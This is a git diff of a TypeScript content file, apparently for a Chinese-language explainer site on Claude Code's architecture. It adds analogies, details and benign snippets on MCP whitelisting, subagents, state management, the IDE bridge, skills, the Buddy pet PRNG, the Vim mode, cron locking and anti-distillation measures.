-      "内置服务器包括 Chrome 集成和 Computer Use（计算机控制），无需额外配置。",
-      "通道白名单和权限系统确保 MCP 工具的安全使用。",
-      "MCP 输出会被缓存到 mcpOutputStorage，提高重复调用的效率。",
+      "MCP 让 Claude Code 能够无限扩展工具能力，连接到任何实现了 MCP 协议的服务器。它是 Claude Code 与外部世界对接的标准化桥梁。",
+      "内置服务器包括 Chrome 集成和 Computer Use（计算机控制），无需额外配置即可使用。",
+      "通道白名单采用'保镖式'设计——不是在工具级别做权限控制，而是在整个插件（通道）级别。一个插件要么被完全信任并放行，要么完全被阻止。这比逐工具审核更安全，因为恶意插件无法通过添加新工具来绕过限制。",
+      "白名单数据存储在 GrowthBook（功能开关服务）中，可以在云端热更新。发现某个 MCP 插件有安全漏洞？不需要发版——在 GrowthBook 里把它移出白名单，所有用户立即生效。",
+      "MCP 配置支持 7 种作用域层级：个人全局 → 个人项目 → 团队全局 → 团队项目 → 企业全局 → 企业项目 → 运行时参数。像俄罗斯套娃一样，内层优先级高于外层。",
+      "MCP 输出会被缓存到 mcpOutputStorage，相同的工具调用不会重复执行，提高效率并降低外部 API 调用成本。",
+      "WebSocket 传输层支持长连接和双向通信——MCP 服务器可以主动推送状态变更，而不只是被动响应请求。",
+      "动态工具注册意味着连接一个新的 MCP 服务器后，它的工具自动出现在 AI 可用工具列表中，无需重启或手动配置。",
+    ],
+    insights: [
+      {
+        title: "保镖式白名单——整个插件要么进要么不进",
+        analogy: "夜店保镖看的是你这个人能不能进，不是逐一检查你口袋里的东西",
+        explanation: "MCP 的权限控制在插件（通道）级别而非工具级别。一个 MCP 服务器要么被完全信任，要么完全不被信任。这比逐工具审核安全得多：如果只控制工具，恶意插件可以随时注册新工具绕过限制。控制整个通道，就堵死了这条路。",
+      },
+      {
+        title: "白名单在云端可热更新",
+        analogy: "就像银行的黑名单是实时更新的——不需要把所有 ATM 机拆回去刷固件",
+        explanation: "MCP 通道白名单存储在 GrowthBook（云端功能开关服务）中。发现某个 MCP 插件有漏洞？运维在后台把它移出白名单，全球所有 Claude Code 用户立即生效——不需要发布新版本，不需要用户手动更新。这种'远程断路器'设计在安全事件响应中至关重要。",
+      },
+      {
+        title: "7 种配置作用域像俄罗斯套娃",
+        analogy: "就像公司规章：国家法律 > 公司制度 > 部门规定 > 个人偏好——越具体的越优先",
+        explanation: "MCP 配置有 7 层作用域，从个人到企业。企业管理员可以在最外层强制要求使用特定的安全 MCP 服务器，团队可以在中层添加团队专用工具，个人可以在最内层自定义。冲突时，更具体（更内层）的配置优先。这让大组织既能统一管控，又给个人留有灵活空间。",
+      },
     ],
   },
   {
@@ -895,10 +1292,45 @@ export const AgentTool: Tool = {
       { from: "execute", to: "report" },
     ],
     details: [
-      "子代理是 Claude Code 处理复杂任务的关键机制 — 将大任务分解为可并行的小任务。",
-      "Explore 类型代理专门用于快速搜索代码库，Plan 类型用于设计实现方案。",
-      "KAIROS (coordinator) 是高级自主规划系统，支持多步规划和自我反思循环。",
-      "Swarm 框架支持多个代理之间的消息传递和协调。",
+      "子代理是 Claude Code 处理复杂任务的关键机制——将大任务分解为可并行的小任务，每个子代理独立运行。",
+      "Explore 类型代理专门用于快速搜索代码库（只有读取工具），Plan 类型用于设计实现方案（同样只读），general 类型拥有完整工具集。",
+      "KAIROS (coordinator) 是高级自主规划系统，支持多步规划和自我反思循环——AI 会评估自己的计划质量并迭代改进。",
+      "Swarm 框架支持多个代理之间的消息传递和协调，可以让多个子代理同时处理同一个大型重构任务的不同部分。",
+      "子代理创建时，系统消息（system prompt）不是重新生成的，而是直接传递父代理已渲染好的字节。这样做是为了命中 Anthropic API 的 prompt cache——相同的字节序列可以被缓存，避免重复计算。",
+      "子代理通过检查历史消息中的标记来判断自己是否是子代理。如果发现自己已经是子代理，就不会再创建下一级子代理——防止无限递归导致资源耗尽。",
+      "每个子代理有独立的颜色编码（agentColorManager），在终端 UI 中用不同颜色区分，用户可以直观看到哪个代理在做什么。",
+      "Worktree 隔离让每个子代理在独立的 git worktree 中工作，修改互不干扰。任务完成后，变更可以合并回主分支。",
+    ],
+    insights: [
+      {
+        title: "子代理继承父亲的记忆而非复印",
+        analogy: "就像给同事转发一封已经排好版的邮件，而不是让他从头写一封内容一样的邮件",
+        explanation: "创建子代理时，系统消息直接传递父代理已渲染好的字节（bytes），而不是重新生成。为什么？因为 Anthropic API 有 prompt cache 机制——如果发送的字节序列完全一致，API 可以跳过重复的处理。重新生成即使内容相同，时间戳等细节可能不同，就会导致 cache miss。这个优化让子代理的启动速度大幅提升。",
+        code: `// forkSubagent.ts - 传递已渲染的字节
+const systemPrompt = parentContext.renderedSystemPrompt
+// ✅ 直接传递已渲染的字节 → prompt cache 命中
+// ❌ 不要重新调用 renderSystemPrompt() → cache miss`,
+      },
+      {
+        title: "代理不能无限分裂",
+        analogy: "就像公司规定'经理可以招人，但新员工不能再招人'——防止组织无限膨胀",
+        explanation: "Claude Code 如何防止子代理创建子子代理，无限递归下去？答案很巧妙：子代理通过检查自己的历史消息中是否包含特定标记来判断'我是不是子代理'。如果是，就拒绝创建下一级。这不需要额外的计数器或配置——利用已有的消息结构就实现了递归保护。",
+      },
+      {
+        title: "Buddy 宠物用哈希决定命运",
+        analogy: "就像用身份证号尾数决定抽奖号码——看起来随机，但同一个人永远得到同一个结果",
+        explanation: "Buddy 宠物的物种不是随机生成然后存起来的——它是用用户 ID 的哈希值通过确定性伪随机数生成器（mulberry32）计算出来的。同一个用户永远得到同一种宠物，但分布在统计上是均匀的。不需要数据库，不需要网络，离线也能工作。",
+        code: `// mulberry32 确定性 PRNG
+function mulberry32(seed: number) {
+  return function() {
+    seed |= 0; seed = seed + 0x6D2B79F5 | 0
+    let t = Math.imul(seed ^ seed >>> 15, 1 | seed)
+    t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t
+    return ((t ^ t >>> 14) >>> 0) / 4294967296
+  }
+}
+// 用户ID → 哈希 → 种子 → 固定的物种`,
+      },
     ],
   },
   {
@@ -997,9 +1429,31 @@ function useAppState<T>(selector: (state: AppState) => T): T {
       { from: "notify", to: "persist" },
     ],
     details: [
-      "AppState 是 Claude Code 的单一数据源，所有 UI 组件从中读取状态。",
-      "不可变更新确保了状态变更的可追踪性和 React 渲染的正确性。",
-      "观察者模式允许非 React 代码（如服务层）响应状态变更。",
+      "AppState 是 Claude Code 的单一数据源，所有 UI 组件从中读取状态。它是一个巨大的 React Context，包含消息、工具状态、UI 状态、设置、子代理状态等所有运行时数据。",
+      "不可变更新确保了状态变更的可追踪性和 React 渲染的正确性。每次 setAppState 调用都创建一个新的状态对象，而不是修改现有对象。",
+      "观察者模式允许非 React 代码（如服务层、Bridge 通信层）响应状态变更。onChangeAppState 是唯一的副作用出口——所有需要在状态变更时触发的操作都注册在这里。",
+      "Selector 模式使用 useSyncExternalStore 实现精确订阅：组件只在自己关心的状态片段变化时重新渲染，而不是每次 AppState 变化都渲染。",
+      "Object.is() 比较是 React 判断是否需要重渲染的核心。因为使用不可变更新，如果某个状态片段没变，它的引用就不变，Object.is() 返回 true，React 跳过渲染——零成本判断。",
+      "AppStateStore 将关键状态持久化到磁盘（JSON 文件），确保 Claude Code 意外退出后能恢复会话状态。",
+      "终端 UI 使用 React + Ink 框架渲染——是的，Claude Code 的终端界面是用 React 写的，所以状态管理自然采用了 React 的模式。",
+    ],
+    insights: [
+      {
+        title: "Object.is() 一招鲜吃遍天",
+        analogy: "就像你看快递箱子——箱子没换过就不用打开检查里面的东西有没有变",
+        explanation: "React 判断要不要重新渲染时，不会深度比较两个对象的每个字段。它只用 Object.is() 比较引用——是同一个对象吗？因为 Claude Code 使用不可变更新（每次修改都创建新对象），没被改过的部分引用不变，React 立即知道'这部分没变，跳过'。整个判断过程几乎零成本。",
+        code: `// 不可变更新的威力
+const prev = { messages: [...], ui: { loading: true } }
+const next = { ...prev, ui: { loading: false } }
+// next.messages === prev.messages → true (引用没变)
+// Object.is(next.messages, prev.messages) → true
+// → React 跳过所有只依赖 messages 的组件`,
+      },
+      {
+        title: "所有副作用走一个漏斗",
+        analogy: "就像公司的所有对外支出都必须经过财务部——不允许任何部门自己偷偷花钱",
+        explanation: "onChangeAppState 是 Claude Code 中唯一的副作用出口。需要在状态变更时写文件？注册到 onChangeAppState。需要发送通知？也注册到 onChangeAppState。这种单一出口设计让副作用变得可追踪、可调试。如果出了问题，只需要查看 onChangeAppState 的注册列表，而不是在整个代码库中搜索。",
+      },
     ],
   },
   {
@@ -1094,9 +1548,31 @@ async function bridgeMainLoop() {
       { from: "permission", to: "archive" },
     ],
     details: [
-      "Bridge 是 Claude Code IDE 集成的核心，bridgeMain.ts 和 replBridge.ts 共约 215K，是代码量最大的模块。",
-      "支持 3 种会话模式：single-session（单会话）、worktree（Git Worktree 隔离）、same-dir（同目录）。",
-      "设备信任机制确保只有授权设备可以通过 Bridge 执行操作。",
+      "Bridge 是 Claude Code IDE 集成的核心，bridgeMain.ts 和 replBridge.ts 共约 215K，是代码量最大的模块——比很多独立项目的全部代码都多。",
+      "支持 3 种会话模式：single-session（单会话，最常用）、worktree（Git Worktree 隔离，适合并行任务）、same-dir（同目录多会话）。",
+      "设备信任机制确保只有授权设备可以通过 Bridge 执行操作。每个设备首次连接需要通过身份验证，之后用设备令牌免验证。",
+      "Bridge 采用轮询（polling）而非推送模式获取任务——定期向后端查询'有没有新任务给我？'。虽然不如 WebSocket 实时，但更可靠，穿透防火墙和代理也更容易。",
+      "笔记本电脑合盖（睡眠）再打开时，Bridge 会检测到系统睡眠事件并自动重置连接状态。不会因为网络超时而惩罚性断开——识别到是睡眠导致的断开，平滑恢复。",
+      "最多同时支持 32 个活跃会话（MAX_SESSIONS = 32）。像酒店前台管理房间一样，每个会话有独立的运行环境，互不干扰。",
+      "权限请求的转发是 Bridge 最复杂的部分之一——IDE 端弹出权限对话框，用户做出选择，选择结果通过 WebSocket 传回本地 Claude 进程。整个过程需要超时处理和错误恢复。",
+      "归档系统自动清理完成的会话，释放资源。长时间不活跃的会话也会被自动归档。",
+    ],
+    insights: [
+      {
+        title: "睡眠检测自动重置——不惩罚合盖",
+        analogy: "就像闹钟知道你是睡着了而不是故意不接电话——醒来后不会把你标记为'失联'",
+        explanation: "笔记本合盖（睡眠）会导致所有网络连接超时。普通系统可能会因为超时把连接标记为'失败'，需要手动重连。但 Bridge 能检测到系统睡眠事件，知道这不是网络故障而是正常的睡眠。打开笔记本时自动平滑恢复，不需要任何手动操作。",
+      },
+      {
+        title: "最多同时开 32 个会话",
+        analogy: "就像酒店最多有 32 个房间——每个房间独立运行，前台统一管理入住和退房",
+        explanation: "Claude Code 支持最多 32 个并发会话，每个会话有独立的运行环境。这让你可以在 VS Code 中同时开多个 Claude 对话窗口，或者在 IDE 中边写代码边让另一个会话跑测试。会话管理器像酒店前台，分配房间（进程），处理入住（创建），退房（归档），打扫（清理资源）。",
+      },
+      {
+        title: "Bridge 选择轮询而非推送",
+        analogy: "就像定期去信箱查信，而不是让邮递员按门铃——虽然慢一点，但任何房子都能收信",
+        explanation: "Bridge 用轮询（每隔几秒问一次'有新任务吗？'）而非 WebSocket 推送获取任务。看似低效，实则是深思熟虑的选择：轮询能穿透几乎所有防火墙和企业代理，不需要保持长连接，断线恢复也更简单。对于 IDE 集成这种对延迟不太敏感的场景，可靠性比实时性更重要。",
+      },
     ],
   },
   {
@@ -1167,6 +1643,36 @@ export const commitSkill: Skill = {
 }`,
         description: "技能本质上是预定义的提示词模板，封装了最佳实践和工作流。",
       },
+      {
+        title: "全部 17 个内置技能一览",
+        language: "typescript",
+        code: `// ═══ 常驻技能（10 个）═══
+// /commit     — 智能 git commit（分析变更，生成 message）
+// /simplify   — 审查变更文件，优化代码质量和复用性
+// /verify     — 验证代码变更是否按预期工作
+// /debug      — 调试当前 Claude Code 会话
+// /skillify   — 将当前会话流程捕获为可复用技能
+// /remember   — 审查并报告用户的记忆数据
+// /batch      — 编排大规模并行化代码变更
+// /stuck      — 诊断 Claude Code 卡顿/冻结问题
+// /update-config — 通过 settings.json 配置 Claude Code
+// /lorem-ipsum   — 生成占位文本用于测试
+
+// ═══ 条件/Feature-gated 技能（7 个）═══
+// /dream      — 需要 KAIROS feature flag
+// /hunter     — 代码审查追踪（需要 REVIEW_ARTIFACT）
+// /loop       — 循环执行提示词（需要 AGENT_TRIGGERS）
+// /schedule-remote-agents — 远程代理调度
+// /claude-api — Claude API / SDK 开发指南
+// /claude-in-chrome — Chrome 浏览器自动化
+// /run-skill-generator — 技能生成器
+
+// 技能 vs 命令的区别：
+// 命令 = TypeScript 函数，直接操作运行时
+// 技能 = 提示词模板，通过 AI 间接执行
+// 技能更容易创建（只需写提示词），但能力有限`,
+        description: "17 个内置技能覆盖了常用开发工作流，条件技能通过 Feature Flags 控制可见性。",
+      },
     ],
     flowSteps: [
       { id: "trigger", label: "触发技能", description: "用户输入 /skill-name" },
@@ -1180,9 +1686,32 @@ export const commitSkill: Skill = {
       { from: "expand", to: "execute" },
     ],
     details: [
-      "技能是 Claude Code 的用户友好扩展机制 — 比 Hook 更简单，直接通过 /command 触发。",
-      "内置技能包括 commit、review、simplify 等常用开发工作流。",
-      "MCP 技能构建器可以将 MCP 服务器的工具自动包装为可调用的技能。",
+      "技能是 Claude Code 的用户友好扩展机制——比 Hook 更简单，直接通过 /command 触发，无需编写 shell 脚本。",
+      "内置技能包括 commit（智能提交）、review（代码审查）、simplify（代码简化）等 19 个常用开发工作流。每个技能本质上是一个精心设计的提示词模板。",
+      "MCP 技能构建器可以将 MCP 服务器的工具自动包装为可调用的技能——MCP 提供原始工具能力，技能构建器把它包装成用户友好的 /command。",
+      "技能加载系统（loadSkillsDir.ts, 34K）会扫描多个目录发现技能：内置目录、用户全局目录（~/.claude/skills/）、项目目录（.claude/skills/）。",
+      "条件技能只在特定条件下出现——比如某个技能只有当项目中存在 Dockerfile 时才会被加载。这通过文件路径匹配实现，避免无关技能污染用户的命令列表。",
+      "符号链接去重是一个微妙但重要的优化：如果 ~/.claude/skills/ 中有指向项目 .claude/skills/ 的符号链接，系统通过 realpath 解析真实路径，避免同一个技能被加载两次。",
+      "技能支持参数传递——/commit -m 'fix bug' 中的参数会被注入到提示词模板中，让技能更灵活。",
+      "自动触发（autoTrigger）让某些技能在匹配特定意图时自动激活，用户甚至不需要显式输入 /command。",
+    ],
+    insights: [
+      {
+        title: "条件技能像潜伏特工",
+        analogy: "就像卧底只在接到暗号时才暴露身份——平时隐藏在普通人中间",
+        explanation: "有些技能只在特定条件下才出现在用户可用列表中。比如一个 Docker 相关技能，只有当项目中存在 Dockerfile 时才会被加载和显示。这通过文件路径匹配实现——技能定义中包含'我需要哪些文件存在才激活'的条件。这样用户看到的 /command 列表始终是和当前项目相关的，不会被无关技能淹没。",
+      },
+      {
+        title: "符号链接去重防止分身",
+        analogy: "就像公司通讯录里不会因为一个人有两个工位就把他列两次",
+        explanation: "如果用户在全局技能目录（~/.claude/skills/）创建了指向项目技能目录（.claude/skills/）的符号链接，系统会用 realpath 解析出真实路径。发现两个路径指向同一个文件？只加载一次。这个看似小的优化避免了实际使用中一个恼人的问题：同一个技能出现两次，用户不知道该选哪个。",
+        code: `// loadSkillsDir.ts - 符号链接去重
+const realPath = fs.realpathSync(skillPath)
+if (loadedPaths.has(realPath)) {
+  continue  // 已经加载过了，跳过
+}
+loadedPaths.add(realPath)`,
+      },
     ],
   },
   {
@@ -1284,10 +1813,65 @@ function onUserInteraction(buddy: Buddy) {
       { from: "feature", to: "voice" },
     ],
     details: [
-      "Buddy 宠物系统是 Claude Code 的彩蛋之一，为长期用户提供趣味性。",
-      "Vim 模式支持完整的 Vim 键绑定，让 Vim 用户感到宾至如归。",
-      "反蒸馏是商业保护措施，防止竞争对手通过分析输出来训练类似模型。",
-      "Cron 调度器支持在后台定时执行任务，如定期检查部署状态。",
+      "Buddy 宠物系统是 Claude Code 的彩蛋之一。18 种物种、4 种稀有度（70% 普通、29% 稀有、1% 传奇、0.01% 闪光传奇），每次使用 Claude Code 都会给宠物累积经验值。",
+      "Vim 模式实现了完整的 Vim 键绑定，使用 TypeScript 联合类型构建纯函数状态机。每个 Vim 模式（Normal、Insert、Visual、Command）是一个类型状态，状态转换通过纯函数实现——输入旧状态和按键事件，输出新状态，不存在中间的非法状态。",
+      "语音模块使用了懒加载策略——底层的本地语音识别库（通过 dlopen 加载）可能需要 8 秒以上的初始化时间。如果在启动时就加载，会严重拖慢 Claude Code 的启动速度。所以设计为用户第一次使用语音功能时才触发加载。",
+      "反蒸馏保护包括多项措施：剥离输出中的工具列表（不暴露内部工具名）、剥离模型信息（不暴露模型 ID）、剥离 thinking 内容（不暴露推理过程）。undercover 模式让 Claude 在输出中不泄露系统提示词。",
+      "Cron 调度器使用文件锁（lockfile）协调多个 Claude 进程——当多个终端窗口同时运行 Claude Code 时，只有获得文件锁的进程会执行定时任务，其他进程跳过。",
+      "Cron 调度器还引入了随机 jitter（抖动）：不是所有用户都在整点执行任务，而是在时间窗口内随机偏移几分钟。这避免了全球数百万用户同时向 API 发送请求的'惊群效应'。",
+      "物种名称在构建产物中使用字符编码隐藏——防止竞争对手通过 grep 扫描构建产物发现内部代号和敏感功能名称。配合 Bun 编译时 Feature Flags 的死代码消除，构建产物中找不到任何未启用功能的痕迹。",
+      "UltraPlan 是一个高级规划 UI，让用户以交互式方式与 Claude 共同设计实现方案——比简单的文本对话更结构化。",
+    ],
+    insights: [
+      {
+        title: "Vim 模式是纯函数状态机",
+        analogy: "就像自动售货机——投入硬币（输入）和按钮（事件）决定了下一个状态和输出，不存在'半按下'的按钮",
+        explanation: "Vim 的 Normal、Insert、Visual、Command 四种模式被建模为 TypeScript 联合类型。每次按键事件通过纯函数处理：输入当前状态和按键，输出新状态。因为 TypeScript 的类型系统强制穷举所有状态组合，编译器保证不存在未处理的非法状态转换。这比传统的 if-else 状态管理安全得多。",
+        code: `// Vim 状态机的类型安全设计
+type VimMode =
+  | { mode: 'normal' }
+  | { mode: 'insert' }
+  | { mode: 'visual', anchor: number }
+  | { mode: 'command', buffer: string }
+
+// 纯函数状态转换 — TypeScript 强制穷举
+function handleKey(state: VimMode, key: string): VimMode {
+  switch (state.mode) {
+    case 'normal':
+      if (key === 'i') return { mode: 'insert' }
+      if (key === 'v') return { mode: 'visual', anchor: cursor }
+      // ... TypeScript 确保处理所有 case
+  }
+}`,
+      },
+      {
+        title: "语音模块懒加载——8 秒的代价",
+        analogy: "就像家里的应急发电机——不会一直开着浪费油，只在停电时才启动",
+        explanation: "语音识别依赖本地库（通过 dlopen 动态加载），初始化可能需要 8 秒以上。如果在 Claude Code 启动时就加载它，每次打开终端都要多等 8 秒——但 99% 的用户根本不用语音功能。所以设计为懒加载：第一次用 /voice 时才初始化。只有真正需要的人承担那 8 秒等待。",
+      },
+      {
+        title: "Cron 调度器用文件锁协调",
+        analogy: "就像卫生间的门锁——谁先锁上门谁用，其他人看到'有人'就去下一个",
+        explanation: "当你开了 3 个终端窗口都运行着 Claude Code，定时任务不应该执行 3 次。解决方案是文件锁：执行前先尝试获取锁文件，拿到了就执行，拿不到就跳过（说明另一个进程已经在处理了）。加上随机 jitter，全球用户的定时任务不会同时触发，避免 API 被瞬间涌入的请求压垮。",
+        code: `// Cron 文件锁 + jitter
+const lock = await acquireFileLock('.claude/cron.lock')
+if (!lock) return  // 另一个进程已经在执行
+
+// 随机 jitter：避免所有用户同时触发
+const jitter = Math.random() * maxJitterMs
+await sleep(jitter)
+
+try {
+  await executeScheduledTask(task)
+} finally {
+  await releaseLock(lock)
+}`,
+      },
+      {
+        title: "物种名用字符编码隐藏",
+        analogy: "就像间谍用密码本通信——即使信件被截获，看到的也只是一串数字而非明文",
+        explanation: "构建产物中的物种名称（如 Buddy 系统的物种）使用字符编码替代明文。这样竞争对手即使拿到了编译后的 JavaScript 文件，用 grep 搜索也找不到这些内部代号。配合 Bun 的编译时 Feature Flags 和死代码消除，未启用的功能在构建产物中完全不存在——不是被注释掉，是物理上被删除了。",
+      },
     ],
   },
 ];
